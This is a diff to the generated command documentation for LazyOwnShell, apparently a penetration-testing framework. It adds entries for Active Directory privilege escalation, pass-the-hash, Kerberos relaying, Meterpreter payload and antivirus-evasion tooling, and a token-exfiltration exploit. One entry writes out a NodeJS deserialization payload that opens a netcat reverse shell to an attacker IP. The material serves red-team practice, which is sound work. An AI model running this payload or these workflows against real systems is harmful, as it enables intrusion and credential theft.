@@ -174,7 +174,29 @@
 </header>
 <h1 id="commands.md-documentation-by-readmeneitor.py">COMMANDS.md
 Documentation by readmeneitor.py</h1>
+<h2 id="log_request">log_request</h2>
+<p>No description available.</p>
+<h2 id="log_message">log_message</h2>
+<p>No description available.</p>
+<h2 id="get">GET</h2>
+<p>No description available.</p>
 <h2 id="init"><strong>init</strong></h2>
+<p>No description available.</p>
+<h2 id="open_file">open_file</h2>
+<p>Open and parse the IP-to-ASN file.</p>
+<h2 id="open_reader">open_reader</h2>
+<p>Parse the reader stream, handling both regular and gzipped files.</p>
+<h2 id="parse_file">_parse_file</h2>
+<p>Parse the TSV data and load it into memory.</p>
+<h2 id="as_of_ip">as_of_ip</h2>
+<p>Return the ASN associated with the given IP address.</p>
+<h2 id="rec_index_has_ip">_rec_index_has_ip</h2>
+<p>Check if the given index contains the IP.</p>
+<h2 id="as_name">as_name</h2>
+<p>Get the AS name by ASN.</p>
+<h2 id="as_country">as_country</h2>
+<p>Get the country by ASN.</p>
+<h2 id="init-1"><strong>init</strong></h2>
 <p>Initializer for the LazyOwnShell class.</p>
 <p>This method sets up the initial parameters and scripts for an
 instance of the LazyOwnShell class. It initializes a dictionary of
@@ -342,6 +364,14 @@ the database of binary exploitables from <code>gtofbins</code>.</p>
 <p>Note: - Ensure that the script has execute permissions. - The script
 should be run with the necessary privileges if required.</p>
 <h2 id="lazynmap">lazynmap</h2>
+<p>Runs the internal module <code>modules/lazynmap.sh</code> for
+multiple Nmap scans.</p>
+<p>This method executes the <code>lazynmap</code> script, using the
+current working directory and the <code>rhost</code> parameter from the
+<code>self.params</code> dictionary as the target IP. If
+<code>rhost</code> is not set, it prints an error message.</p>
+<p>:return: None</p>
+<h2 id="batchnmap">batchnmap</h2>
 <p>Runs the internal module <code>modules/lazynmap.sh</code> for
 multiple Nmap scans.</p>
 <p>This method executes the <code>lazynmap</code> script, using the
@@ -4774,12 +4804,19 @@ Certificate Services.</p>
 IP or hostname specified in the line argument. 2. If line is “find”, it
 executes the certipy find command to enumerate AD CS. 3. If line is
 “shadow”, it prompts for an account and executes the certipy shadow
-command. 4. If line does not match “pass”, “hash”, “find”, or “shadow”,
-it displays an error message with usage instructions.</p>
+command. 4. If line is “req”, it prompts for user details and executes
+the certipy req command to request a certificate. 5. If line is “auth”,
+it prompts for PFX details and executes the certipy auth command for
+authentication. 6. If line is “update”, it prompts for user details and
+executes the certipy account update command. 7. If line does not match
+any valid actions, it displays an error message with usage
+instructions.</p>
 <p>Parameters: line (str): Command argument specifying the action mode.
 If “find”, it enumerates AD CS. If “shadow”, it abuses shadow
-credentials for account takeover. If neither, it displays an error
-message with usage instructions.</p>
+credentials for account takeover. If “req”, it requests a certificate.
+If “auth”, it authenticates using a PFX file. If “update”, it updates
+user information. If none of these, it displays an error message with
+usage instructions.</p>
 <p>Returns: None</p>
 <h2 id="follina">follina</h2>
 <p>Executes the MSDT Follina exploit tool to create malicious documents
@@ -4878,6 +4915,419 @@ integer.</p>
 <p>Example: do_rocky(‘8’) # Executes: grep ‘^.{8}$’
 /usr/share/wordlists/rockyou.txt &gt;
 sessions/lazypass_mini_rocky.txt</p>
+<h2 id="pywhisker">pywhisker</h2>
+<p>Executes the pyWhisker tool for manipulating the
+msDS-KeyCredentialLink attribute of a target user or computer.</p>
+<p>This function performs the following actions: 1. Checks if pyWhisker
+is installed; if not, it clones the repository. 2. Executes various
+actions on the msDS-KeyCredentialLink attribute, allowing actions like
+listing, adding, spraying, removing, clearing, exporting, or importing
+KeyCredentials for a specified target user or computer.</p>
+<p>The command accepts different authentication options: - NTLM
+(Cleartext password or Pass-the-hash) - Kerberos (Cleartext password,
+Pass-the-key, Pass-the-cache)</p>
+<p>Parameters: line (str): Command argument specifying the pyWhisker
+action and options. Expected format: - -t TARGET_SAMNAME or -tl
+TARGET_SAMNAME_LIST for the target account(s) - -a ACTION to specify the
+action (list, add, spray, remove, clear, info, export, import) -
+Optional flags for authentication and connection</p>
+<p>Returns: None</p>
+<h2 id="owneredit">owneredit</h2>
+<p>Executes the Impacket owneredit tool for manipulating ownership of
+Active Directory objects.</p>
+<p>This function performs the following actions: 1. Prompts the user for
+necessary parameters if not provided. 2. Executes the command to change
+the owner of a specified target in Active Directory.</p>
+<p>The command accepts the following parameters: - New owner (user) for
+the target object. - Target object to be manipulated. - Domain
+credentials for authentication. - DC IP address for the domain
+controller.</p>
+<p>Parameters: line (str): Command argument specifying the new owner and
+target options. Expected format: - -new-owner NEW_OWNER for the new
+owner - -target TARGET_OBJECT for the target object - Required flags for
+authentication and connection</p>
+<p>Returns: None</p>
+<h2 id="net_rpc_addmem">net_rpc_addmem</h2>
+<p>Executes the net rpc group addmem command to add a user to a
+specified group in Active Directory.</p>
+<p>This function performs the following actions: 1. Prompts the user for
+necessary parameters if not provided. 2. Executes the command to add a
+user to a specified group in Active Directory.</p>
+<p>The command accepts the following parameters: - Group name to which
+the user will be added. - User to be added to the group. - Domain
+credentials for authentication. - DC IP address for the domain
+controller.</p>
+<p>Parameters: line (str): Command argument specifying the user and
+group options. Expected format: - “GROUP_NAME” for the group name -
+“$USER” for the user to add - Required flags for authentication and
+connection</p>
+<p>Returns: None</p>
+<h2 id="pth_net">pth_net</h2>
+<p>Executes the Pass-the-Hash (PTH) Net tool to change the password of
+an Active Directory account.</p>
+<p>This function performs the following actions: 1. Prompts the user for
+necessary parameters if not provided. 2. Executes the command to change
+the password for the specified account using Pass-the-Hash
+authentication.</p>
+<p>The command accepts the following parameters: - Target account for
+which the password will be changed. - New password to be set for the
+account. - Domain credentials for authentication. - DC IP address for
+the domain controller. - NTLM hash for Pass-the-Hash authentication.</p>
+<p>Parameters: line (str): Command argument specifying the target
+account and new password options. Expected format: - ACCOUNT for the
+target account (default: ca_operator) - NEW_PASSWORD for the new
+password (default: newP@ssword2022) - Required flags for authentication
+and connection</p>
+<p>Returns: None</p>
+<h2 id="gettgtpkinit_py">gettgtpkinit_py</h2>
+<p>Executes the gettgtpkinit.py tool from PKINITtools to request a TGT
+using Kerberos PKINIT with a PFX or PEM certificate.</p>
+<p>This function performs the following actions: 1. Checks if
+PKINITtools is installed; if not, it clones the repository and installs
+dependencies. 2. Requests a TGT using the specified PFX or PEM
+certificate and outputs the TGT to the specified ccache file.</p>
+<p>Parameters: line (str): Command arguments specifying the certificate
+file and ccache location. Expected format: - domain/username ccache -
+Additional flags like -cert-pfx file, -pfx-pass password, -cert-pem
+file, etc.</p>
+<p>Returns: None</p>
+<h2 id="getnthash_py">getnthash_py</h2>
+<p>Executes the getnthash.py tool from PKINITtools to retrieve the NT
+hash using a Kerberos U2U TGS request.</p>
+<p>This function performs the following actions: 1. Checks if
+PKINITtools is installed; if not, it clones the repository and installs
+dependencies. 2. Retrieves the NT hash using the AS-REP key from a
+previously generated TGT.</p>
+<p>Parameters: line (str): Command arguments specifying the AS-REP key
+and target identity. Expected format: - identity - Additional flags like
+-key KEY, -dc-ip ip address, etc.</p>
+<p>Returns: None</p>
+<h2 id="gets4uticket_py">gets4uticket_py</h2>
+<p>Executes the gets4uticket.py tool from PKINITtools to request an
+S4U2Self service ticket using Kerberos.</p>
+<p>This function performs the following actions: 1. Checks if
+PKINITtools is installed; if not, it clones the repository and installs
+dependencies. 2. Requests a service ticket using the S4U2Self protocol
+and outputs it to the specified ccache file.</p>
+<p>Parameters: line (str): Command arguments specifying the
+kerberos_connection_url, SPN, target user, and ccache. Expected format:
+- kerberos_connection_url spn targetuser ccache - Additional flags like
+-v for verbose output.</p>
+<p>Returns: None</p>
+<h2 id="aclpwn_py">aclpwn_py</h2>
+<p>Executes the aclpwn.py tool to find and exploit ACL paths for
+privilege escalation in an Active Directory environment.</p>
+<p>This function performs the following actions: 1. Checks if aclpwn is
+installed; if not, it installs the package. 2. Finds an exploit path
+using specified starting and target points in Active Directory. 3.
+Executes the path to escalate privileges if the path is found.</p>
+<p>Parameters: line (str): Command arguments specifying the find and
+target points, domain, and optional flags. Expected format: - -f
+starting_point -ft starting_type -d domain - Additional flags like -t
+target, -tt target_type, –server, -dry, –restore, etc.</p>
+<p>Returns: None</p>
+<h2 id="addspn_py">addspn_py</h2>
+<p>Executes the addspn.py tool to manage Service Principal Names (SPNs)
+on Active Directory accounts via LDAP.</p>
+<p>This function performs the following actions: 1. Checks if Krbrelayx
+is installed; if not, it clones the repository and installs
+dependencies. 2. Adds, removes, or queries SPNs on the specified target
+based on the provided options.</p>
+<p>Parameters: line (str): Command arguments specifying the target
+hostname, user credentials, and SPN actions. Expected format: - hostname
+user password target spn -options - Options include: - -r to remove an
+SPN - -q to query current SPNs - -a to add SPN via
+msDS-AdditionalDnsHostName</p>
+<p>Returns: None</p>
+<h2 id="dnstool_py">dnstool_py</h2>
+<p>Executes the dnstool.py tool to modify Active Directory-integrated
+DNS records.</p>
+<p>This function performs the following actions: 1. Checks if Krbrelayx
+is installed; if not, it clones the repository and installs
+dependencies. 2. Modifies DNS records by adding, removing, or querying
+based on the specified options.</p>
+<p>Parameters: line (str): Command arguments specifying the DNS action,
+target record, and data. Expected format: - hostname user password
+record action -options - Options include: - -a to add a record - -r to
+remove a record - –forest to target ForestDnsZones</p>
+<p>Returns: None</p>
+<h2 id="printerbug_py">printerbug_py</h2>
+<p>Executes the printerbug.py tool to trigger the SpoolService bug via
+RPC backconnect.</p>
+<p>This function performs the following actions: 1. Checks if Krbrelayx
+is installed; if not, it clones the repository and installs
+dependencies. 2. Executes the printerbug tool to attempt an RPC
+backconnect to the specified attacker host.</p>
+<p>Parameters: line (str): Command arguments specifying the target and
+attacker host. Expected format: - target_username@target_host
+attacker_host</p>
+<p>Returns: None</p>
+<h2 id="krbrelayx_py">krbrelayx_py</h2>
+<p>Executes the krbrelayx.py tool for Kerberos relaying or unconstrained
+delegation abuse.</p>
+<p>This function performs the following actions: 1. Checks if Krbrelayx
+is installed; if not, it clones the repository and installs
+dependencies. 2. Relays Kerberos tickets or abuses unconstrained
+delegation to access target services.</p>
+<p>Parameters: line (str): Command arguments specifying the target and
+options. Expected format: - target options - Options include: - -t
+target_host to specify the target host - -l loot directory to save TGTs
+or dump information</p>
+<p>Returns: None</p>
+<h2 id="autoblody">autoblody</h2>
+<p>Executes the autobloody tool for automating Active Directory
+privilege escalation paths.</p>
+<p>This function performs the following actions: 1. Checks if autobloody
+is installed; if not, it clones the repository and installs
+dependencies. 2. Executes the autobloody command to find and exploit
+privilege escalation paths.</p>
+<p>Parameters: line (str): Command arguments specifying the source and
+target objects and options. Expected format: - -u username for NTLM
+authentication - -p password for NTLM authentication - –host
+domain_controller_ip for the IP of the Domain Controller - -dp
+neo4j_password for Neo4j database password - -ds source_label for the
+source node label in BloodHound - -dt target_label for the target node
+label in BloodHound</p>
+<p>Returns: None</p>
+<h2 id="upload_gofile">upload_gofile</h2>
+<p>Uploads a file to Gofile storage.</p>
+<p>This function performs the following actions: 1. Prepares the file
+and folder ID for upload. 2. Sends a POST request to Gofile API with the
+file and authorization token. 3. Handles the response from the API and
+prints the result.</p>
+<p>Parameters: line (str): Command arguments specifying the file path
+and options. Expected format: - <file_path> - Options include: -
+–folderId <folder_id> to specify the folder where the file should be
+uploaded</p>
+<p>Returns: None</p>
+<h2 id="unicode_wafbypass">unicode_WAFbypass</h2>
+<pre><code>We open a Netcat listener on port 443 and attempt to exploit NodeJS deserialization by sending the
+    following payload:
+    {&quot;rce&quot;:&quot;_$$ND_FUNC$$_function() {require(&#39;child_process&#39;).exec(&#39;nc -e /bin/bash 10.10.xx.xx 443&#39;,function(error,stdout,stderr) {console.log (stdout) });</code></pre>
+<p>}()“} Some WAF can be bypassed with the use of unicode
+characters.</p>
+<pre><code>Generate an obfuscated payload, encode it in base64, and append the SSH public key to the authorized_keys file.
+    
+    Args:
+        ip_address (str): The IP address for the reverse shell connection.
+        port (int): The port for the reverse shell connection.
+        ssh_public_key (str): The SSH public key to add to authorized_keys.
+    
+    Returns:
+        str: The base64-encoded obfuscated payload.</code></pre>
+<h2 id="sqli_mssql_test">sqli_mssql_test</h2>
+<p>Initiates a reverse MSSQL shell by starting an HTTP server to handle
+incoming connections and exfiltrate data.</p>
+<p>This function does the following: 1. Starts an HTTP server to listen
+for connections from the MSSQL server. 2. Intercepts and decodes
+responses from the target server. 3. Prompts the user to enter commands,
+sends them to the target, and displays the output.</p>
+<p>Parameters: line (str): Unused command argument from the cmd2
+prompt.</p>
+<p>Returns: None</p>
+<h2 id="targetedkerberoas">targetedKerberoas</h2>
+<p>Executes the targetedKerberoast tool for extracting Kerberos service
+tickets.</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of the targetedKerberoast tool; if not installed, it clones the
+repository and installs dependencies. 2. Prompts for parameters such as
+the domain, username, and other configurations required by
+targetedKerberoast. 3. Executes the targetedKerberoast tool with
+specified options for obtaining “kerberoastable” hashes.</p>
+<p>Parameters: line (str): Command arguments specifying the user,
+domain, and options. Expected format: - domain user hash or password
+[optional parameters]</p>
+<p>Returns: None</p>
+<h2 id="pyoracle2">pyoracle2</h2>
+<p>Executes the pyOracle2 tool for performing padding oracle
+attacks.</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of the pyOracle2 tool; if not installed, it clones the
+repository and installs dependencies. 2. Prompts the user for
+configuration parameters or retrieves them from self.params to create a
+job-specific configuration file. 3. Executes the pyOracle2 tool using
+the generated configuration file and specified options.</p>
+<p>Parameters: line (str): Command arguments specifying additional tool
+options if required. Expected format: [optional parameters]</p>
+<p>Returns: None</p>
+<h2 id="paranoid_meterpreter">paranoid_meterpreter</h2>
+<p>Creates and deploys a paranoid Meterpreter payload and listener with
+SSL/TLS pinning and UUID tracking.</p>
+<p>This function performs the following actions: 1. Generates a
+self-signed SSL/TLS certificate for payload encryption. 2. Creates
+either staged or stageless Meterpreter payloads with UUID tracking and
+TLS pinning. 3. Configures and launches a Metasploit listener for the
+payload.</p>
+<p>Parameters: line (str): Command arguments specifying target
+configurations. Expected format: - rhost lhost domain subdomain</p>
+<p>Returns: None</p>
+<h2 id="lfi">lfi</h2>
+<p>Exploits a potential Local File Inclusion (LFI) vulnerability by
+crafting and sending HTTP GET requests to a specified URL.</p>
+<p>The user can specify the target URL directly via the
+<code>line</code> parameter or provide it interactively. If no URL is
+provided, the method uses a default value stored in
+<code>self.params["url"]</code>. Users are then prompted to specify the
+file to retrieve from the server, defaulting to
+<code>/etc/passwd</code>.</p>
+<p>Args: line (str): Optional URL input provided directly in the command
+line. If not supplied, a default URL from
+<code>self.params["url"]</code> will be used.</p>
+<p>Behavior: - Continuously prompts the user to specify a file to fetch
+via the target LFI vulnerability. - Sends a GET request to the
+constructed URL and prints the server’s response to the console. -
+Allows users to inspect different files on the target server by
+modifying the file path interactively.</p>
+<h2 id="greatsct">greatSCT</h2>
+<p>Executes the GreatSCT tool for generating payloads that bypass
+antivirus and application whitelisting solutions.</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of the GreatSCT tool; if not installed, it clones the
+repository and installs dependencies. 2. Configures and generates the
+payload using user-provided or default parameters. 3. Executes the
+GreatSCT tool with the specified options.</p>
+<p>Parameters: line (str): Command arguments specifying additional tool
+options if required. Expected format: [–ip <IP> –port <PORT> –tool
+<TOOL> –payload <PAYLOAD>]</p>
+<p>Returns: None</p>
+<h2 id="sqsh">sqsh</h2>
+<p>Executes the Impacket sqsh tool for manipulating ownership of Active
+Directory objects.</p>
+<p>This function performs the following actions: 1. Prompts the user for
+necessary parameters if not provided. 2. Executes the command to change
+the owner of a specified target in Active Directory.</p>
+<p>The command accepts the following parameters: - New owner (user) for
+the target object. - Target object to be manipulated. - Domain
+credentials for authentication. - DC IP address for the domain
+controller.</p>
+<p>Parameters: line (str): Command argument specifying the new owner and
+target options. Expected format: - -new-owner NEW_OWNER for the new
+owner - -target TARGET_OBJECT for the target object - Required flags for
+authentication and connection</p>
+<p>Returns: None</p>
+<h2 id="setoolkits">setoolKits</h2>
+<p>Executes the SEToolKit workflow to generate a Meterpreter payload and
+configure the multi-handler using LHOST and LPORT from self.params.</p>
+<p>Usage: do_setoolKits</p>
+<p>Arguments: None: LHOST and LPORT are retrieved from self.params.</p>
+<p>Workflow: 1. Launches SEToolKit. 2. Navigates to option 1
+(Social-Engineering Attacks). 3. Selects option 9 (Powershell
+Alphanumeric Shellcode Injector). 4. Configures LHOST and LPORT using
+values from self.params. 5. Generates a Meterpreter reverse HTTPS
+payload. 6. Configures a multi-handler to listen for incoming
+connections.</p>
+<h2 id="jwt_tool">jwt_tool</h2>
+<p>Uses the jwt_tool to analyze, tamper, or exploit JSON Web Tokens
+(JWTs).</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of jwt_tool; if not installed, it clones the repository and
+installs dependencies. 2. Accepts a JWT token as input or uses the
+provided argument for analysis. 3. Executes jwt_tool with the specified
+options and prints the results.</p>
+<p>Parameters: line (str): Command argument containing a JWT token to
+analyze. If not provided, prompts the user for a token.</p>
+<p>Returns: None</p>
+<h2 id="darkarmour">darkarmour</h2>
+<p>Uses the darkarmour tool to generate an undetectable version of a PE
+executable.</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of darkarmour; if not installed, it clones the repository and
+installs dependencies. 2. Prompts the user for various options to
+customize the tool’s behavior. 3. Constructs a command to run darkarmour
+with the selected options. 4. Executes darkarmour to generate the output
+file with the desired level of obfuscation.</p>
+<p>Parameters: line (str): Command line arguments for the tool.</p>
+<p>Returns: None</p>
+<h2 id="osmedeus">osmedeus</h2>
+<p>Executes Osmedeus scans with guided input for various scanning
+scenarios.</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of Osmedeus; if not installed, it clones the repository and
+installs the required dependencies. 2. Guides the user through selecting
+the type of scan, target, and any additional parameters needed for the
+scan. 3. Constructs and executes the appropriate Osmedeus command.</p>
+<p>Parameters: line (str): Command-line arguments for the tool. If not
+provided, interactive input will be used.</p>
+<p>Returns: None</p>
+<h2 id="metabigor">metabigor</h2>
+<p>Executes Metabigor commands for OSINT and scanning tasks with guided
+input or predefined arguments.</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of Metabigor; if not installed, it clones the repository and
+installs the required dependencies. 2. Guides the user through selecting
+the type of task (IP discovery, related domains, scan, etc.), target,
+and additional parameters. 3. Constructs and executes the appropriate
+Metabigor command based on the user’s input or the provided
+argument.</p>
+<p>Parameters: line (str): Command-line arguments for Metabigor. If not
+provided, interactive input will be used.</p>
+<p>Returns: None</p>
+<h2 id="ip2asn">ip2asn</h2>
+<p>Command to get ASN for a given IP address.</p>
+<h2 id="atomic_tests">atomic_tests</h2>
+<p>Executes Atomic Red Team tests based on user-selected platform and
+test.</p>
+<p>This function performs the following actions: 1. Verifies the
+presence of the Atomic Red Team repository; if not present, it clones it
+locally. 2. Prompts the user to select a target platform, filtering the
+available tests to only those compatible. 3. Displays the filtered
+tests, including their description and platform compatibility. 4. Allows
+the user to select and execute a test or specify parameters
+directly.</p>
+<p>Parameters: line (str): Command-line arguments for specifying a test
+ID or additional parameters. If not provided, interactive input will be
+used.</p>
+<p>Returns: None</p>
+<h2 id="mitre_test">mitre_test</h2>
+<p>Interacts with the MITRE ATT&amp;CK framework using the STIX 2.0
+format.</p>
+<p>This function connects to a locally cached or downloaded ATT&amp;CK
+dataset in STIX 2.0 format. It allows the user to explore tactics,
+techniques, and procedures (TTPs) and filter them based on specific
+criteria, such as platform or tactic.</p>
+<p>Parameters: line (str): User input, which may specify filters or
+actions, such as a tactic name or technique ID.</p>
+<p>Usage: mitre_test list # Lists all tactics and techniques mitre_test
+tactic <name> # Lists techniques for a specific tactic mitre_test
+technique <id> # Shows details of a specific technique</p>
+<h2 id="bbot">bbot</h2>
+<p>Executes a BBOT scan to perform various reconnaissance tasks.</p>
+<p>This function leverages BBOT, a reconnaissance tool, to perform tasks
+such as subdomain enumeration, email gathering, web scanning, and more.
+It dynamically determines the operation based on user input and executes
+the appropriate BBOT commands.</p>
+<p>Parameters: line (str): User input specifying the target and optional
+presets or configurations.</p>
+<p>Usage: bbot -t <target> -p <preset></p>
+<p>Examples: bbot -t evilcorp.com -p subdomain-enum bbot -t evilcorp.com
+-p email-enum spider web-basic</p>
+<h2 id="amass">amass</h2>
+<p>Executes Amass to perform a passive enumeration on a given
+domain.</p>
+<p>This function performs the following steps: 1. Executes the Amass
+tool with the provided domain for passive enumeration. 2. Saves the
+results to a file named ‘results.txt’ in the current directory.</p>
+<p>Parameters: line (str): The domain to be enumerated, e.g.,
+‘example.com’.</p>
+<p>Returns: None</p>
+<h2 id="filtering">filtering</h2>
+<p>Applies various filtering techniques to the given command line by
+modifying each character or word appropriately.</p>
+<p>This function takes any command and generates variations of it using
+several filtering techniques, including: 1. Quote filtering. 2. Slash
+filtering.</p>
+<p>Parameters: line (str): The input command to be filtered.</p>
+<p>Returns: None</p>
+<h2 id="lol">lol</h2>
+<p>Exploits a target by injecting a malicious payload and collecting
+admin information.</p>
+<p>This function performs the following steps: 1. Logs in to the
+application with provided credentials. 2. Injects a malicious payload to
+elevate the role of a user to ‘admin.’ 3. Executes a secondary payload
+to exfiltrate admin tokens by abusing ‘/api/info.’ 4. Prepares for
+further exploitation using ‘/admin’ and ‘/api/json-rpc’.</p>
+<p>Parameters: line (str): Additional parameters for the target.</p>
+<p>Returns: None</p>
 <h2 id="find_tgts">find_tgts</h2>
 <p>Finds and returns a list of target hosts with port 445 open in the
 specified subnet.</p>
